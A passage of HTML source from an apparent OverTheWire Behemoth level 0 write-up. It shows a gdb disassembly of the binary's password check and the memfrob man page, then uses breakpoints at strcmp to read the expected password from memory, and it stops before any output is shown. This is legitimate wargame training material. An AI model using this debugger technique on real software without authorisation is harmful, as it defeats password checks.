   &lt;span class=&quot;mh&quot;&gt;0x080485f3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;81&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x2b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x080485f7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x080485fb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;movl&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x804876c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048602&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x8048470&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__isoc99_scanf&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048607&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;101&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x1f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x0804860b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;105&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x0804860e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;108&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x8048440&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048613&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;113&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048617&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;117&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x1f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x0804861b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;121&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x0804861e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;124&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x804857d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;memfrob&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048623&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;129&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x1f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048627&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;133&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x0804862b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;137&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x2b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x0804862f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;141&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048632&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;144&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x80483f0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048637&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;149&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048639&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;151&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;jne&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x8048665&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;195&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x0804863b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;153&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;movl&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8048771&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048642&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;160&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x8048420&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048647&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;165&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;movl&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;quit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;---&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x0804864f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;173&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;movl&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8048782&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048657&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;181&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;movl&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8048785&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x0804865e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;188&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x8048460&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execl&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048663&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;193&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;jmp&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x8048671&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;207&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048665&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;195&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;movl&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x804878d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x0804866c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;202&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x8048420&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048671&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;207&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048676&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;212&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x6c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x0804867a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;216&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;xor&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048681&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;223&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;je&lt;/span&gt;     &lt;span class=&quot;mh&quot;&gt;0x8048688&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;230&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048683&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;225&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x8048410&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__stack_chk_fail&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x08048688&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;230&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;leave&lt;/span&gt;  
   &lt;span class=&quot;mh&quot;&gt;0x08048689&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;231&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;    
&lt;span class=&quot;n&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;assembler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's take a look at the man pages description. &lt;/p&gt;

&lt;p&gt;&lt;i&gt;The  memfrob() function encrypts the first n bytes of the memory area s
by exclusive-ORing each character with the number 42.  The  effect  can
be reversed by using memfrob() on the encrypted memory area.&lt;/i&gt;&lt;/p&gt;

&lt;p&gt;&lt;i&gt;Note  that  this function is not a proper encryption routine as the XOR
constant is fixed, and is suitable only for hiding strings.&lt;/i&gt;&lt;/p&gt;

&lt;p&gt;That looks like a good thing to exploit, but I have another idea. Firstly, we will have to set a breakpoint at the &lt;b&gt;strcmp&lt;/b&gt; function. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;0x08048632
Breakpoint 1 at 0x8048632
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run
Starting program: /games/behemoth/behemoth0
Password: AAAAAAA

Breakpoint 1, 0x08048632 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;main &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now let's take a look at the &lt;b&gt;0x0804862f&lt;/b&gt; address. This line copies the value from &lt;b&gt;%eax&lt;/b&gt; to the location in memory that &lt;b&gt;%esp&lt;/b&gt; points to. Maybe we can view what &lt;b&gt;%eax&lt;/b&gt; is storing inside? &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/s &lt;span class=&quot;nv&quot;&gt;$eax&lt;/span&gt;
0xffffd67b:	&lt;span class=&quot;s2&quot;&gt;&quot;AAAAAAA&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Wow, that's the password we have entered just seconds ago! So maybe &lt;b&gt;%esp&lt;/b&gt; will be our desired password? &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/s &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
